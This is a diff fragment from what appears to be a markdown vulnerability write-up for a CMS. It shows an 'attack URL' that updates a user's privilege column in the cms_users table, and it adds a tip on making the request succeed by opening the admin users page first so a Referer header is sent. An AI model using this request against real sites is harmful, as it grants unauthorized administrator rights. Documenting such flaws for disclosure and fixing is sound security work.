@@ -86,6 +86,8 @@ While still logged in as admin, open this URL in the browser (adjust host, user 
 https://YOUR-SITE/admin/users/update-single?table=cms_users&column=id_cms_privileges&value=1&id=2
 ```
 
+**Tip:** Open `/admin/users` first, then paste the attack URL in the address bar. If you open the attack URL cold (no Referer), you are redirected to the module list after one request — the DB update still runs once; check with SQL.
+
 You can use **any module path**, not only `users`. Example from another menu:
 
 ```
